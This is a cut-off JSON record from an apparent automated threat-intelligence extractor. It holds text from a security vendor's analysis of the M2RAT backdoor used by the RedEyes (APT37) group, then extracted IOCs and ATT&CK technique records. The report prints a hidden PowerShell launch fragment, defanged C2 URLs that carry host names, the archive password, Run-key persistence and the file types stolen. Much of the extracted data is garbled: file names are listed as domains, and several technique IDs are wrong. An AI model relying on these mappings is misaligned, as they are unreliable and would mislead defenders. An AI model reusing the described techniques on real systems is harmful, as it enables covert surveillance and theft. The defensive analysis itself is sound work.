Performs remote control commands (Keylogging and process creation/execution) Table 1. Description of threat actor s commands M2RAT s threat actor server manages hosts with MAC addresses in order to distinguish affected hosts. When infected with M2RAT  the MAC address is encoded (XOR) with 0x5c and saved in the  HKCU\\Software\\OneDriver  path s  Version  value. The encoded MAC address value is used to distinguish affected hosts in the threat actor s server. Registry key path: HKCU\\Software\\OneDriver Value name: Version Value: Value that XOR-encoded (0x5c) MAC address of the affected host The result value of the command sent by the threat actor to the affected host is saved in the  _Encoded MAC Address Value_2  folder of the threat actor s server. The screenshots taken by M2RAT from the affected host are saved in the  _Encoded MAC Address Value_cap  folder. (Refer to Figure 12) Figure 12. Threat actor s server (Example) (The server screen in Figure 12 is a screen created by AhnLab s analysis system to resemble the threat actor s webserver.) 1 0 / 1 3 Additionally  M2RAT XOR encodes with 0x5c and saves the threat actor s server address info in the  Property  value of the same registry key path as the MAC address. Registry key path: HKCU\\Software\\OneDriver Value name: Property Value: Value that XOR-encoded (0x5c) threat actor s server address In the future  the threat actor can transmit the  URL  and  UPD  commands to M2RAT to update their server address (Refer to Table 1). The  URL  command is used to update the registry key with a new address and the  UPD  command is used to change the threat actor s address defined in the currently running instance of M2RAT. The remote control command of M2RAT is established by transmitting CMD commands from the threat actor s server. The Chinotto malware  which was confirmed to have been used by the RedEyes group in the past  executed remote control commands through the Query String method  but M2RAT creates a shared memory section to execute the commands from the threat actor s server. Like the threat actor s use of the steganography technique in the initial breach stage  this appears to also be for the purpose of evading network detection by hiding the command info in the Body of the POST. (  Query String: A string that starts with a question mark at the end of a URL) The CMD command is transmitted through the shared memory. The memory section name info is shown below in Table 2. Section Name Feature RegistryModuleInputMap2Transmits additional module execution results (e.g. Mobile phone data leak module) FileInputMap2 Explores drives (A:\\   Z:\\)  create/write files  and changes file time CaptureInputMap2Screenshots the current screen of the affected host s PC ProcessInputMap2Checks the process list  create/terminate processes RawInputMap2 Use ShellExectueExW API to run process TypingRecordInputMap2Leaks keylogging data UsbCheckingInputMap2USB data leak (hwp  doc  docx  xls  xlsx  ppt  pptx  cell  csv  show  hsdt  mp3  amr  3gp  m4a  txt png  jpg  jpeg  gif  pdf  eml) Table 2. Features of the shared memory section 2.4.2. Exfiltration M2RAT s exfiltration features include screenshots of the affected host s screen  process information  keylogging information  and data (documents and voice files) leaks. In the case of screenshots  they are taken regularly even if a command is not given by the threat actor. They are then sent to the threat actor s server where they are saved as  result_[number]  in the  _Encoded MAC Address Value_cap  folder. The remaining data leaks are saved in the  _Encoded MAC Address Value_2  folder. If there are documents or voice recordings with sensitive data in removable storage devices or shared folders  then these are copied into the  TEMP  path  compressed into a password-protected file with Winrar (RAR.exe)  and the results are then transmitted to the threat actor s server. Folder path where data is copied to:  Temp \\Y_ m_ d_ H_ M_ S // (e.g.  TEMP \\Year_Month_Date _Hour_Minute_Second) File extensions: hwp  doc  docx  xls  xlsx  ppt  pptx  cell  csv  show  hsdt  mp3  amr  3gp  m4a  txt  png  jpg  jpeg  gif  pdf  eml 1 1 / 1 3 The RAR.exe options that are used are as follows. The path the compressed file is created into is the same as the  TEMP  folder path. a -df -r -hp dgefiue389d@39r 1Ud -m1  Compressed file creation path   Compression target path  Option NameDescription a Compress df Delete file after compression r Recover compressed file hp Encrypt file data and header m Set compression level Table 3. Explanation of RAR compression options The ASEC analysis team was also able to uncover through the ASD (AhnLab Smart Defense) infrastructure an Infostealer communicating with M2RAT. This malware was identified as a .NET file that steals files saved on mobile phones and sends them to the RegistryModuleResultMap2 shared memory section of M2RAT. Figure 13. Code that transmits exfiltrated data to M2RAT 1 2 / 1 3 Figure 14. Mobile phone data theft target (file extension) info The .NET file s PDB info is as follows. PDB : E:\\MyWork\\PhoneDataCp\\PhoneDeviceManager\\PhoneDeviceManager\\obj\\x86\\Release\\PhoneDeviceManager.pdb 3. Conclusion 1 3 / 1 3 The RedEyes group is an APT hacking organization that is supported on a national level. They are known to attack individual targets such as human rights activists  reporters  and North Korean defects. Their aim appears to be exfilitration. Defending against such APT attacks is an extremely complicated process. Especially since the RedEyes group is known to target individuals instead of corporations. It is difficult for individuals to even realize they have been affected. The ASEC analysis team is closely tracking this group. Should a new TTPs be found from this threat actor  we will quickly share the details as we did in this blog post to contribute towards minimizing damage. 4. IOC [MD5 (Detection name  engine version)] 8b666fc04af6de45c804d973583c76e0 // EPS file   Exploit/EPS.Generic (2023.01.16.03) 93c66ee424daf4c5590e21182592672e // Steganography JPEG   Data/BIN.Agent (2023.02.15.00) 7bab405fbc6af65680443ae95c30595d // PE file(JPEG) Stage PE file   Trojan/Win.Loader.C5359534 (2023.01.16.03) 9083c1ff01ad8fabbcd8af1b63b77e66 // Powershell script   Downloader/PS.Generic.SC185661 (2023.01.16.03) 4488c709970833b5043c0b0ea2ec9fa9 // M2RAT   Trojan/Win.M2RAT.C5357519 (2023.01.14.01) 7f5a72be826ea2fe5f11a16da0178e54 // Mobile phone data theft   Infostealer/Win.Phone.C5381667 (2023.02.14.03) 5. References Categories:Malware Information Tagged as:APT37 M2RAT MaptoRAT RedEyes ScarCruft",
            "commands": [
              "Powershell and the normal Windows utility, mshta,",
              "Powershell and executed. The result",
              "Powershell and the Chinotto malware to steal PC information and remote",
              "cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping",
              "Powershell and mshta commands to the autorun registry Run key to establish a persistent connection with",
              "cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep",
              "Powershell script \u2013 Downloader/PS.Generic.SC185661 (2023.01.16.03) 4488c709970833b5043c0b0ea2ec9fa9 // M2RAT \u2013 Trojan/Win.M2RAT.C5357519 (2023.01.14.01) 7f5a72be826ea2fe5f11a16da0178e54 // Mobile phone data theft \u2013 Infostealer/Win.Phone.C5381667 (2023.02.14.03)",
              "Powershell code",
              "Powershell adds a \u201cU\u201d parameter to the threat actor\u2019s server address when transmitting the computer name",
              "Powershell command, which receives and executes commands from the"
            ],
            "file_paths": [
              "/Win.M2RAT.C5357519",
              "c:\\windows\\system32\\cmd.exe",
              "/PS.Generic.SC185661",
              "/www.*******elearning.or[.]kr/popup/handle/log.php?U=[Computer",
              "E:\\MyWork\\PhoneDataCp\\PhoneDeviceManager\\PhoneDeviceManager\\obj\\x86\\Release\\PhoneDeviceManager.pdb",
              "/EPS.Generic",
              "/Win.Loader.C5359534",
              "A:\\",
              "/www.*******elearning.or[.]kr/popup/handle/1.html",
              "/Win.Phone.C5381667",
              "/",
              "/BIN.Agent",
              "/www.*******elearning.or[.]kr/popup/handle/log.php?R=[BASE64-encoded]",
              "/[redacted].cafe24[.]com/bbs/probook/1.html",
              "/www.*****elearning.or[.]kr/popup/handle/1.html"
            ],
            "registry_keys": [
              "HKCU\\Software\\OneDriver",
              "HKCU\\Software\\OneDriver\u201d",
              "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            ]
          },
          "entities": {
            "malware": [
              "APT",
              "Malware",
              "Trojan",
              "backdoor",
              "downloader",
              "loader",
              "rat"
            ],
            "tools": [
              "Powershell",
              "Sc",
              "at",
              "cmd",
              "mshta",
              "net",
              "ping",
              "reg"
            ],
            "threat_actors": [
              "APT37"
            ],
            "ips": [
              "2.2.2.2"
            ],
            "domains": [
              "1.html",
              "BIN.Agent",
              "EPS.Generic",
              "Form.hwp",
              "PS.Generic",
              "PhoneDeviceManager.pdb",
              "PowerShell.exe",
              "RAR.exe",
              "Win.Loader",
              "Win.Phone",
              "asec.ahnlab.com",
              "cmd.exe",
              "elearning.or",
              "explorer.exe",
              "log.php",
              "lskdjfel.exe",
              "wallup.net"
            ],
            "hashes": {
              "md5": [
                "4488c709970833b5043c0b0ea2ec9fa9",
                "7bab405fbc6af65680443ae95c30595d",
                "7f5a72be826ea2fe5f11a16da0178e54",
                "8b666fc04af6de45c804d973583c76e0",
                "9083c1ff01ad8fabbcd8af1b63b77e66"
              ]
            }
          },
          "ttp_indicators": {
            "initial_access": [
              "Exploit Public-Facing Application"
            ],
            "execution": [
              "PowerShell",
              "Command and Scripting Interpreter"
            ],
            "persistence": [
              "Registry Run Keys"
            ],
            "defense_evasion": [
              "Obfuscated Files or Information",
              "Process Injection"
            ],
            "collection": [
              "Archive Collected Data",
              "Screen Capture"
            ],
            "exfiltration": [
              "Exfiltration Over C2 Channel"
            ],
            "command_and_control": [
              "Application Layer Protocol"
            ]
          },
          "context": "**Observed Commands:**\n- Powershell and the normal Windows utility, mshta,\n- Powershell and executed. The result\n- Powershell and the Chinotto malware to steal PC information and remote\n- cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping\n- Powershell and mshta commands to the autorun registry Run key to establish a persistent connection with\n\n**File System Activity:**\n- /Win.M2RAT.C5357519\n- c:\\windows\\system32\\cmd.exe\n- /PS.Generic.SC185661\n- /www.*******elearning.or[.]kr/popup/handle/log.php?U=[Computer\n- E:\\MyWork\\PhoneDataCp\\PhoneDeviceManager\\PhoneDeviceManager\\obj\\x86\\Release\\PhoneDeviceManager.pdb\n\n**Registry Modifications:**\n- HKCU\\Software\\OneDriver\n- HKCU\\Software\\OneDriver\u201d\n- HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\n**Network Indicators:**\n- Form.hwp\n- PhoneDeviceManager.pdb\n- Win.Loader\n- 2.2.2.2\n- elearning.or\n- log.php\n- BIN.Agent\n- RAR.exe\n- Win.Phone\n- PowerShell.exe\n\n**Key Security Terms:** evasion, exploitation, cmd, terminate, process, malware, persistence, inject, powershell, create"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 13.712,
          "llm_processing_time_ms": 5643.351
        }
      }
    ],
    "ttps": [
      {
        "ttp_id": "3b7476bd-489c-4da2-83ad-1cef12d37369",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Shared Memory",
        "attack_id": "T1497",
        "tactic": "Defense Evasion",
        "description": "M2RAT creates a shared memory section to execute commands from the threat actor's server",
        "confidence_score": 0.739,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.359,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "shared memory"
        ],
        "tools": [
          "reg",
          "ping",
          "M2RAT",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "f559214e-3b38-46b2-a4b5-96a0de70cf6b",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Steganography",
        "attack_id": "T1091",
        "tactic": "Defense Evasion",
        "description": "The threat actor used steganography to embed malware within an image file",
        "confidence_score": 0.738,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.276,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "wallup.net",
          "JPEG image file",
          "XOR key: FD DD 28 F5 7C 48 8E 7E 0C E0 17 77 35 87 3B 49"
        ],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "Steganography tool",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "cf50d4fe-5d77-4fdc-b0b9-01462057044f",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "MSHTA",
        "attack_id": "T1170",
        "tactic": "Execution",
        "description": "The threat actor used mshta to execute an HTA file containing JavaScript code",
        "confidence_score": 0.736,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.299,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "mshta.exe",
          "hxxps://www.*****elearning.or[.]kr/popup/handle/1.html"
        ],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "c41fae42-2f07-4d24-bab8-0f03ce91002a",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Autorun Registration",
        "attack_id": "T1060",
        "tactic": "Persistence",
        "description": "The RedEyes group used the RUN key command for autorun registration to establish a consistent connection with the C&C server",
        "confidence_score": 0.724,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.46,
          "tool_mentions": 1.0,
          "context_richness": 0.76,
          "multiple_sources": 0.5
        },
        "indicators": [
          "RUN key command"
        ],
        "tools": [
          "reg",
          "ping",
          "Malware",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "4cd8f8db-9bf3-4798-94ba-c125c88d4ff4",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Command and Control",
        "attack_id": "T1071",
        "tactic": "Command and Control",
        "description": "M2RAT's C&C communications command system involves receiving commands from the threat actor's server through the POST method's Body",
        "confidence_score": 0.723,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.414,
          "tool_mentions": 1.0,
          "context_richness": 0.76,
          "multiple_sources": 0.5
        },
        "indicators": [
          "hxxps://www.*******elearning.or[.]kr/popup/handle/log.php?R=[BASE64-encoded]",
          "hxxps://www.*******elearning.or[.]kr/popup/handle/log.php?U=[Computer Name]+[Username]"
        ],
        "tools": [
          "reg",
          "ping",
          "M2RAT",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "0efcb11f-8feb-46ca-a007-cd87167ab9d6",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Exfiltration",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "The RedEyes group exfiltrated PC information and mobile phone data of their targets",
        "confidence_score": 0.721,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.299,
          "tool_mentions": 1.0,
          "context_richness": 0.86,
          "multiple_sources": 0.5
        },
        "indicators": [
          "PC information",
          "Mobile phone data"
        ],
        "tools": [
          "reg",
          "ping",
          "Malware",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "501d52b9-0d49-4c9d-8e77-4d7dd6028730",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Steganography",
        "attack_id": "T1091",
        "tactic": "Defense Evasion",
        "description": "The RedEyes group used steganography to hide malware in images",
        "confidence_score": 0.72,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.23,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Steganography technique"
        ],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "Steganography tool",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "2e5022bb-149b-4b79-bedf-b642b8f5bbaa",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "PowerShell",
        "attack_id": "T1059.001",
        "tactic": "Execution",
        "description": "The RedEyes group used PowerShell to steal PC information and remote control systems",
        "confidence_score": 0.72,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.299,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "powershell.exe"
        ],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "PowerShell",
          "cve",
          "at",
          "powershell",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "7baa8895-a7dd-49b0-8f06-b0ca97599a93",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Data Compression",
        "attack_id": "T1005",
        "tactic": "Exfiltration",
        "description": "Compressing files with Winrar (RAR.exe) for exfiltration",
        "confidence_score": 0.715,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 1.0,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "RAR.exe",
          "%TEMP%\\Y_%m_%d_%H_%M_%S",
          "hwp",
          "doc",
          "docx",
          "xls",
          "xlsx",
          "ppt",
          "pptx",
          "cell",
          "csv",
          "show",
          "hsdt",
          "mp3",
          "amr",
          "3gp",
          "m4a",
          "txt",
          "png",
          "jpg",
          "jpeg",
          "gif",
          "pdf",
          "eml"
        ],
        "tools": [
          "reg",
          "ping",
          "Winrar",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "b5bde009-2ab2-4b2b-9b93-5a15aeddc1ce",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Command and Control",
        "attack_id": "T1094",
        "tactic": "Command and Control",
        "description": "The RedEyes group used the newly identified M2RAT malware to carry out C&C commands",
        "confidence_score": 0.709,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.322,
          "tool_mentions": 1.0,
          "context_richness": 0.76,
          "multiple_sources": 0.5
        },
        "indicators": [
          "M2RAT malware",
          "Shared memory section"
        ],
        "tools": [
          "reg",
          "ping",
          "M2RAT",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "c59fb50b-21d5-43d4-88a8-b71595b7d23d",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Keylogging",
        "attack_id": "T1056",
        "tactic": "Credential Access",
        "description": "The M2RAT backdoor includes keylogging features",
        "confidence_score": 0.706,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "keylogging data"
        ],
        "tools": [
          "reg",
          "ping",
          "M2RAT",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "ea8dd512-3b9e-4e19-b268-3ab9874d2af4",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Steganography",
        "attack_id": "T1091",
        "tactic": "Defense Evasion",
        "description": "Attacker used steganography in JPEG files",
        "confidence_score": 0.706,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "93c66ee424daf4c5590e21182592672e"
        ],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "Steganography JPEG",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "18eb44e6-4b76-4da4-a8f4-305c8a04e9a7",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Infostealer",
        "attack_id": "T1005",
        "tactic": "Collection",
        "description": "Attacker used Infostealer/Win.Phone.C5381667 for mobile phone data theft",
        "confidence_score": 0.698,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.86,
          "multiple_sources": 0.5
        },
        "indicators": [
          "7f5a72be826ea2fe5f11a16da0178e54"
        ],
        "tools": [
          "Infostealer/Win.Phone.C5381667",
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "12008d8a-8756-4f4d-945c-734c30091104",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Scheduled Task/Job",
        "attack_id": "T1053",
        "tactic": "Persistence",
        "description": "The threat actor registered a command to the registry Run key to establish a persistent connection",
        "confidence_score": 0.695,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.405,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
          "RyPO",
          "c:\\windows\\system32\\cmd.exe /c PowerShell.exe"
        ],
        "tools": [
          "reg",
          "ping",
          "Malware",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "a4a29854-b55f-4b44-b869-7d5d66cde2c9",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Data Obfuscation",
        "attack_id": "T1001",
        "tactic": "Defense Evasion",
        "description": "Threat actor uses steganography technique to evade network detection by hiding command info in the Body of the POST",
        "confidence_score": 0.694,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.437,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "steganography",
          "POST request"
        ],
        "tools": [
          "reg",
          "ping",
          "M2RAT",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "c5c1a8d3-0535-4aad-bb31-860c60224402",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "PowerShell",
        "attack_id": "T1059.001",
        "tactic": "Execution",
        "description": "Attacker used PowerShell for execution",
        "confidence_score": 0.692,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.115,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "powershell.exe"
        ],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "PowerShell",
          "cve",
          "at",
          "powershell",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "cf680435-9373-4d62-9793-41857d8a9731",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Exploitation for Client Execution",
        "attack_id": "T1204",
        "tactic": "Execution",
        "description": "The threat actor exploited a vulnerability in the EPS processing module to execute shellcode",
        "confidence_score": 0.688,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.359,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "CVE-2017-8291",
          "Form.hwp",
          "EPS file"
        ],
        "tools": [
          "reg",
          "ping",
          "Malware",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "dbaa6b49-038e-4ae4-9a69-45a6a42b578a",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "The threat actor used PowerShell to execute commands and download additional malware",
        "confidence_score": 0.687,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.7,
          "description_detail": 0.276,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "PowerShell.exe",
          "-WindowStyle hidden",
          "-NoLogo",
          "-NonInteractive",
          "-ep bypass"
        ],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "PowerShell",
          "cve",
          "at",
          "powershell",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "66983c65-2c78-45f1-a62b-2a0b1486a798",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "PowerShell",
        "attack_id": "T1059.001",
        "tactic": "Execution",
        "description": "Persistence-related Powershell code",
        "confidence_score": 0.685,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.069,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "powershell.exe"
        ],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "PowerShell",
          "cve",
          "at",
          "powershell",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "49e5dc2c-4706-4407-ab33-883c316f9b0a",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "PowerShell",
        "attack_id": "T1086",
        "tactic": "Execution",
        "description": "Detected PowerShell activity via NLP pattern matching",
        "confidence_score": 0.684,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.116,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "df00da9b-a60e-459d-8e87-4b68029e3146",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "The CMD command is transmitted through the shared memory to execute remote control commands",
        "confidence_score": 0.682,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.359,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "CMD",
          "shared memory"
        ],
        "tools": [
          "reg",
          "ping",
          "M2RAT",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "Chinotto malware",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "a535d520-d18c-431c-af7c-3fda82a9b20d",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Trojan",
        "attack_id": "T1190",
        "tactic": "Execution",
        "description": "Attacker used Trojan/Win.Loader.C5359534",
